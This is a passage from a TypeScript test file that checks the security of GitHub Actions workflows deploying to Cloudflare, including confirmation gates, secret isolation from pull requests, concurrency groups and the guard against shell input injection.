    expect(checks, file).toContain(`"$CONFIRMATION" != "${confirmation}"`)
    const job = workflow.jobs[privilegedJob] as WorkflowJob
    expect(job.needs, file).toEqual(['authorize'])
    expect(environmentName(job), file).toBe(environment)
    const [gate] = job.steps ?? []
    expect(gate?.run, file).toContain('exit 1')
    expect(gate?.run, file).toContain('CLOUDFLARE_API_TOKEN')
    if (environment === 'staging') expect(JSON.stringify(workflow), file).not.toMatch(/production/u)
    return job
  }

  it('applies a reviewed manifest to staging D1 from staging only, after a Time Travel bookmark', () => {
    const job = expectAuthorizedDispatch(
      'publish-d1-staging.yml',
      'staging',
      'staging',
      project.confirmation.publishStaging,
      'publish'
    )
    // The bookmark is read-only, so the workflow needs no release authorization (#97 review B1).
    expect(releaseAuthorizations['publish-d1-staging.yml']).toBeUndefined()
    const bookmark = stepRunning(job, 'cloudflare-release.ts bookmark staging')
    expect(bookmark.run).toBe('pnpm tsx scripts/cloudflare-release.ts bookmark staging')
    expect(stepIndex(job, 'cloudflare-release.ts bookmark staging')).toBeLessThan(
      stepIndex(job, 'db:publish:staging')
    )
    // No database export, and nothing uploaded as an artifact of this public repository.
    expect(JSON.stringify(job)).not.toMatch(/upload-artifact|\bbackup\b|d1 export/u)
    const publish = stepRunning(job, 'db:publish:staging')
    expect(publish.run).toBe('pnpm db:publish:staging -- "$MANIFEST_PATH"')
    expect(publish.env).toMatchObject({
      CLOUDFLARE_ACCOUNT_ID: secret('CLOUDFLARE_ACCOUNT_ID'),
      CLOUDFLARE_API_TOKEN: secret('CLOUDFLARE_API_TOKEN'),
      CLOUDFLARE_D1_DATABASE_ID: project.remote.staging.databaseId,
      D1_PUBLICATION_CONFIRM: expression('inputs.confirmation')
    })
    expect(packageScripts['db:publish:staging']).toBe(
      'pnpm tsx scripts/d1-remote-publisher.ts --staging'
    )
  })

  it('uploads a reviewed media plan to each environment from its own branch', () => {
    for (const [file, environment] of Object.entries(mediaUploadWorkflows)) {
      const job = expectAuthorizedDispatch(
        file,
        environment === 'staging' ? 'staging' : 'main',
        environment,
        environment === 'staging'
          ? project.confirmation.mediaUploadStaging
          : project.confirmation.mediaUpload,
        'upload'
      )
      const upload = stepRunning(job, `media:upload:${environment}`)
      expect(upload.run, file).toBe(`pnpm media:upload:${environment} -- "$PLAN_PATH"`)
      for (const name of requiredScriptEnvironment('scripts/media-upload.ts')) {
        expect(Object.keys(upload.env ?? {}), `${file} ${name}`).toContain(name)
      }
      expect(upload.env?.MEDIA_UPLOAD_CONFIRM, file).toBe(expression('inputs.confirmation'))
      expect(packageScripts[`media:upload:${environment}`], file).toBe(
        `pnpm tsx scripts/media-upload.ts --target=${environment}`
      )
      // Uploads change objects, not D1: no release command and no D1 identity.
      expect(JSON.stringify(job), file).not.toMatch(/cloudflare-release|D1_DATABASE_ID/u)
    }
  })
})

describe('protected deployment boundaries', () => {
  it('gates every production job behind an unprivileged ref and confirmation check', () => {
    for (const file of productionDispatchWorkflows) {
      const workflow = loadWorkflow(file)
      expect(Object.keys(workflow.on).sort(), file).toEqual(
        file === 'deploy-production.yml' ? ['push', 'workflow_dispatch'] : ['workflow_dispatch']
      )
      // Publication uses no release command (its bookmark is read-only); its script and the
      // authorize job below hold it to main.
      expect(releaseAuthorizations[file]?.branch ?? 'main', file).toBe('main')
      const authorize = workflow.jobs.authorize as WorkflowJob
      expect(authorize.environment, file).toBeUndefined()
      expect(authorize.concurrency, file).toBeUndefined()
      expect(JSON.stringify(authorize), file).not.toContain('secrets.')
      expect(runs(authorize).join('\n'), file).toContain('"$GITHUB_REF" != "refs/heads/main"')
      const privileged = Object.entries(workflow.jobs).filter(([name]) => name !== 'authorize')
      expect(privileged).toHaveLength(1)
      for (const [name, job] of privileged) {
        expect(job.needs, `${file}:${name}`).toEqual(['authorize'])
        expect(environmentName(job), `${file}:${name}`).toBe('production')
        const [check] = job.steps ?? []
        expect(check?.run, `${file}:${name}`).toContain('exit 1')
        expect(check?.run, `${file}:${name}`).toContain('CLOUDFLARE_API_TOKEN')
      }
    }
  })

  it('serializes privileged jobs only after their guards, so a refused run evicts nothing', () => {
    // By default GitHub keeps one pending run per concurrency group and cancels the older one
    // (the staging group queues instead, `queue: max`). A group on
    // the whole workflow let a mistyped dispatch replace a valid queued run before `authorize`
    // refused it. A job skipped by a failed `needs` or a false `if` never joins its group.
    const expected: Record<string, Record<string, unknown>> = {
      'bootstrap-production-d1.yml': { bootstrap: productionGroup },
      'deploy-production.yml': { release: productionGroup },
      'web.yml': {
        'deploy-staging': {
          group: 'deploy-best-serp-co-staging',
          'cancel-in-progress': false,
          queue: 'max'
        }
      },
      'media-health.yml': {
        check: { group: 'media-health-best-serp-co-production', 'cancel-in-progress': false }
      },
      'publish-d1.yml': { publish: productionGroup },
      'publish-d1-staging.yml': {
        publish: { group: 'deploy-best-serp-co-staging', 'cancel-in-progress': false, queue: 'max' }
      },
      // Uploads hold their own groups, never the deploy groups (#97 review S5).
      'upload-media.yml': {
        upload: { group: 'media-upload-best-serp-co-production', 'cancel-in-progress': false }
      },
      'upload-media-staging.yml': {
        upload: { group: 'media-upload-best-serp-co-staging', 'cancel-in-progress': false }
      }
    }
    expect(Object.keys(expected).sort()).toEqual([...newWorkflows].sort())
    for (const file of newWorkflows) {
      const workflow = loadWorkflow(file)
      // web.yml's workflow group cancels only a superseded pull-request run; a push or dispatch
      // gets a group of its own run id, so it never evicts a queued deploy.
      expect(workflow.concurrency, file).toEqual(
        file === 'web.yml'
          ? {
              group: expression(
                "github.workflow }}-${{ github.event_name == 'pull_request' && github.ref || github.run_id"
              ),
              'cancel-in-progress': expression("github.event_name == 'pull_request'")
            }
          : undefined
      )
      const grouped = Object.fromEntries(
        Object.entries(workflow.jobs)
          .filter(([, job]) => job.concurrency)
          .map(([name, job]) => [name, job.concurrency])
      )
      expect(grouped, file).toEqual(expected[file])
      for (const name of Object.keys(grouped)) {
        const job = workflow.jobs[name] as WorkflowJob
        // Each grouped job is guarded: it runs after `authorize`, or behind a branch `if`.
        expect(job.needs ?? job.if, `${file}:${name}`).toBeTruthy()
        expect(environmentName(job), `${file}:${name}`).toBeDefined()
      }
    }
  })

  it('mutates production automatically only on a push to main, behind the production reviewers', () => {
    const productionMutation =
      /cloudflare-release\.ts (?:migrate|import|deploy) production|db:(?:migrate|publish):production|deploy:production|opennextjs-cloudflare deploy/u
    const automaticMutations: string[] = []
    for (const [file, workflow] of allWorkflows()) {
      const triggers = Object.keys(workflow.on)
      if (!triggers.some(trigger => trigger !== 'workflow_dispatch')) continue
      for (const [name, job] of Object.entries(workflow.jobs)) {
        const mutation = runs(job).join('\n').match(productionMutation)
        if (!mutation && !environmentName(job)?.startsWith('production')) continue
        automaticMutations.push(`${file}:${name}`)
        if (file === 'deploy-production.yml') {
          // A promotion or hotfix push to main: staging verification, then reviewer approval.
          expect(workflow.on.push).toEqual({ branches: ['main'] })
          expect(triggers.sort()).toEqual(['push', 'workflow_dispatch'])
          expect(job.needs).toEqual(['authorize'])
          expect(environmentName(job)).toBe('production')
        } else {
          // The weekly media health check reads production, in its own environment (#122).
          expect(`${file}:${name}`).toBe('media-health.yml:check')
          expect(environmentName(job)).toBe('production-media-health')
          expect(mutation).toBeNull()
        }
      }
    }
    expect(automaticMutations.sort()).toEqual([
      'deploy-production.yml:release',
      'media-health.yml:check'
    ])
  })

  it('keeps Cloudflare credentials out of pull-request workflows and third-party actions', () => {
    for (const [file, workflow] of allWorkflows()) {
      const source = readFileSync(resolve(workflowDirectory, file), 'utf8')
      if (Object.keys(workflow.on).some(trigger => trigger.startsWith('pull_request'))) {
        // web.yml checks pull requests and deploys staging pushes. Its Cloudflare secrets are
        // the staging environment's, and that environment deploys only the staging branch, so a
        // pull request's run, even one that edits this file, cannot read them. The job that
        // names them never runs on a pull request either.
        for (const [name, job] of Object.entries(workflow.jobs)) {
          if (!JSON.stringify(job).includes('CLOUDFLARE')) continue
          expect(`${file}:${name}`).toBe('web.yml:deploy-staging')
          expect(environmentName(job)).toBe('staging')
          expect(job.if).toContain("github.event_name != 'pull_request'")
        }
        if (file !== 'web.yml') expect(source, file).not.toContain('CLOUDFLARE')
      }
    }
    for (const file of newWorkflows) {
      const workflow = loadWorkflow(file)
      // Only the staging-gated workflows read Actions runs (staging before production), and
      // only the one with a hotfix confirmation reads pull requests.
      expect(workflow.permissions, file).toEqual({
        contents: 'read',
        // web.yml reads Actions artifacts to find E2E receipts.
        ...(releaseAuthorizations[file]?.requireVerifiedStaging.length || file === 'web.yml'
          ? { actions: 'read' }
          : {}),
        ...(releaseAuthorizations[file]?.hotfixConfirmation ? { 'pull-requests': 'read' } : {})
      })
      for (const job of Object.values(workflow.jobs)) {
        expect(JSON.stringify(job.env ?? {}), file).not.toContain('secrets.')
        for (const step of job.steps ?? []) {
          if (step.uses)
            expect(JSON.stringify(step), `${file}:${step.name}`).not.toContain('secrets.')
        }
      }
    }
  })

  it('runs every credentialed or deploying job on an ephemeral GitHub-hosted runner', () => {
    // CI_RUNNER_LABELS never moves these, so no secret, D1 data, or Wrangler session lands on a
    // persistent host (docs/CI.md#runners).
    for (const file of [...newWorkflows, 'submit-gsc-sitemaps.yml']) {
      for (const [name, job] of Object.entries(loadWorkflow(file).jobs)) {
        // web.yml's check holds no secret and deploys nothing (scripts/ci-runners.ts routes it).
        if (`${file}:${name}` === 'web.yml:check') continue
        expect(job['runs-on'], `${file}:${name}`).toBe(githubHostedRunner)
      }
    }
  })

  it('passes dispatch inputs to shell steps only through environment variables', () => {
    for (const file of newWorkflows) {
      for (const job of Object.values(loadWorkflow(file).jobs)) {
        for (const run of runs(job)) {
          expect(run, file).not.toMatch(/\$\{\{\s*(?:inputs|github\.event\.inputs)\./u)
        }
      }
    }
  })

  it('runs these workflow and release contracts in the repository and D1 test suites', () => {
    // The unit project takes every scripts/ test the D1 project does not (vitest.config.ts).
    expect(packageScripts['test:repo']).toBe('vitest run --project unit')
    expect(packageScripts['test:d1']).toBe('vitest run --project d1')
    expect(D1_TESTS).not.toContain('scripts/deploy-workflows.test.ts')
    expect(D1_TESTS).toContain('scripts/cloudflare-release.test.ts')
    expect(D1_TESTS).toContain('scripts/staging-verification.test.ts')
  })

  it('names every database command after its target, routing remote mutations through the guard', () => {
    expect(Object.keys(packageScripts).filter(name => name.startsWith('d1:'))).toEqual([])
    for (const environment of ['staging', 'production'] as const) {
      expect(packageScripts[`db:migrate:${environment}`]).toBe(
        `pnpm tsx scripts/cloudflare-release.ts migrate ${environment}`
      )
      expect(packageScripts[`db:migrations:list:${environment}`]).toBe(
        `pnpm tsx scripts/cloudflare-release.ts list-migrations ${environment}`
      )
    }
    expect(packageScripts['db:migrate']).toBeUndefined()
    expect(
      Object.entries(packageScripts)
        .filter(([name]) => name.startsWith('db:') && name.endsWith(':production'))
        .map(([, command]) => command.split(' ').slice(0, 3).join(' '))
    ).toEqual([
      'pnpm tsx scripts/cloudflare-release.ts',
      'pnpm tsx scripts/cloudflare-release.ts',
      'pnpm tsx scripts/d1-remote-publisher.ts'
    ])
  })

  it('passes each production mutation the confirmation the release script requires', () => {
    for (const [file, authorization] of Object.entries(releaseAuthorizations)) {
      const workflow = loadWorkflow(file)
      for (const job of Object.values(workflow.jobs)) {
        for (const step of job.steps ?? []) {
          const match = step.run?.match(/cloudflare-release\.ts ([a-z-]+) (staging|production)/u)
          if (!match) continue
          const [, command, environment] = match
          expect(environment, `${file}: ${step.name}`).toBe(authorization.environment)
          if (readOnlyCommands.has(command as ReleaseCommand)) continue
          expect(authorization.commands, `${file}: ${step.name}`).toContain(command)
          if (authorization.confirmation) {
            expect(step.env?.RELEASE_CONFIRM, `${file}: ${step.name}`).toBe(
              expression('inputs.confirmation')
            )
          }
        }
      }
    }
  })
})
